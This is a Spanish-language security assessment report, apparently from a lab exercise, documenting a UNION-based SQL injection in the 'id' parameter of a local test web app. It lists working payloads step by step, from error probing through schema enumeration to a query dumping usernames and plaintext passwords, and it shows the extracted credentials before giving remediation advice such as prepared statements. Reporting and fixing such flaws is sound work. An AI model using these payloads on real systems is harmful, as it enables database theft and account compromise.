# Informe de Análisis de Seguridad - SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-30 15:18:07  
**Tipo de análisis:** SQL Injection  

---

## Resumen Ejecutivo

Se identificó y explotó con éxito una vulnerabilidad de **SQL Injection basada en UNION** en el parámetro `id` del formulario de búsqueda de usuarios. La aplicación no valida ni sanitiza las entradas del usuario antes de incluirlas directamente en la consulta SQL, permitiendo la extracción completa de la base de datos.

---

## Descripción de la Vulnerabilidad

| Campo | Detalle |
|-------|---------|
| **Tipo** | SQL Injection - UNION based (String) |
| **Parámetro vulnerable** | `id` (GET) |
| **URL afectada** | `http://web.dev.local:8083/?id=<payload>&Submit=Submit` |
| **Severidad** | Crítica |
| **CVSS Score** | 9.8 (Critical) |

### Comportamiento de la aplicación

La aplicación permite buscar usuarios por ID. El parámetro `id` se inyecta directamente en una consulta SQL sin sanitización:

```sql
-- Consulta vulnerable (inferida):
SELECT first_name, last_name FROM users WHERE id = '$id'
```

---

## Pruebas de Concepto

### 1. Detección - Error de sintaxis SQL

**Payload:** `id=1'`  
**Resultado:** Error fatal de MariaDB revelando la ruta del archivo y la estructura de la consulta:
```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; 
check the manual that corresponds to your MariaDB server version for the right syntax 
to use near ''1''' at line 1 in /var/www/html/low.php:11
```

### 2. Confirmación - Inyección booleana

**Payload verdadero:** `id=1' AND '1'='1` → Devuelve resultado  
**Payload falso:** `id=1' AND '1'='2` → No devuelve resultado  
Confirmando control sobre la lógica de la consulta.

### 3. Explotación - UNION SELECT (determinación de columnas)

**Payload:** `id=-1' UNION SELECT 1,2-- -`  
**Resultado:** Éxito con 2 columnas.

### 4. Explotación - Extracción de información del servidor

**Payload:** `id=-1' UNION SELECT database(),version()-- -`  
**Resultado:**
- Base de datos: `sqli_demo`
- Versión del servidor: `10.11.14-MariaDB-ubu2204`

### 5. Explotación - Enumeración de tablas

**Payload:** `id=-1' UNION SELECT table_name,table_schema FROM information_schema.tables WHERE table_schema=database()-- -`  
**Tablas encontradas:**
- `users` (esquema: `sqli_demo`)

### 6. Explotación - Enumeración de columnas

Columnas de la tabla `users`:
- `user_id` (int)
- `first_name` (varchar)
- `last_name` (varchar)
- `username` (varchar)
- `password` (varchar)
- `email` (varchar)

### 7. Explotación - Extracción de credenciales

**Payload:** `id=-1' UNION SELECT CONCAT(first_name,0x20,last_name,0x20,username),password FROM sqli_demo.users-- -`

**Credenciales extraídas:**

| Nombre Completo | Username | Password |
|-----------------|----------|----------|
| John Doe | admin | password123 |
| Jane Smith | jsmith | secret456 |
| Bob Johnson | bjohnson | mypass789 |
| Alice Williams | awilliams | qwerty123 |
| Charlie Brown | cbrown | password |
| Diana Davis | ddavis | secure123 |
| Eve Miller | emiller | hackme |
| Frank Wilson | fwilson | admin123 |

---

## Análisis Técnico

### Causa raíz
La aplicación concatena directamente la entrada del usuario en la consulta SQL sin usar consultas parametrizadas (prepared statements) ni escapado de caracteres especiales. El archivo fuente identificado es `/var/www/html/low.php`.

### Impacto
- **Confidencialidad:** Exposición total de la base de datos, incluyendo credenciales de todos los usuarios.
- **Integridad:** Potencial modificación de datos mediante sentencias INSERT/UPDATE/DELETE.
- **Disponibilidad:** Posible eliminación de datos o bloqueo del servicio.

---

## Recomendaciones

1. **Usar consultas parametrizadas (Prepared Statements):**
   ```php
   $stmt = $conn->prepare("SELECT first_name, last_name FROM users WHERE id = ?");
   $stmt->bind_param("i", $id);
   $stmt->execute();
   ```

2. **Validar y sanitizar entradas:** Verificar que el parámetro `id` sea un entero válido antes de usarlo.

3. **Principio de mínimo privilegio:** El usuario de base de datos debe tener solo los permisos necesarios (no acceso a `information_schema` ni otras bases de datos).

4. **Deshabilitar mensajes de error detallados en producción:** Los errores de base de datos no deben mostrarse al usuario final.

5. **Implementar WAF (Web Application Firewall):** Para detectar y bloquear intentos de inyección SQL.

6. **Cambiar contraseñas expuestas:** Todas las contraseñas almacenadas en texto plano deben ser hasheadas con bcrypt/argon2 y cambiadas inmediatamente.

---

## Conclusión

La aplicación web en `http://web.dev.local:8083` presenta una vulnerabilidad crítica de SQL Injection en el parámetro `id`. Se logró explotar exitosamente mediante técnicas UNION-based, obteniendo información del servidor de base de datos (MariaDB 10.11.14), enumerando la estructura completa de la base de datos `sqli_demo` y extrayendo las credenciales en texto plano de 8 usuarios, incluyendo el usuario administrador.
